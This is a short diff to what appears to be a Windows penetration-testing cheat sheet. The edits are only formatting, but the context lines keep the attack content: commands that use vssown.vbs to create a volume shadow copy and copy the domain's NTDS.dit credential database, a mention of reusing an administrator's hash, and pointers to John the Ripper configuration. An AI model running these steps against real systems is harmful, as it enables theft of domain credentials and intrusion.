@@ -35,7 +35,7 @@ If you can’t crack the hash of a local administrator account you can instead j
 
 ### Volume Shadow Copy Services to copy ntds.dit
 
-```
+```text
 cscript vssown.vbs /start
 cscript vssown.vbs /create
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\NTDS.dit c:\
@@ -93,7 +93,7 @@ John configuration file
 
   > john.conf
 
-* Windows 
+* Windows
 
   > john.ini
 
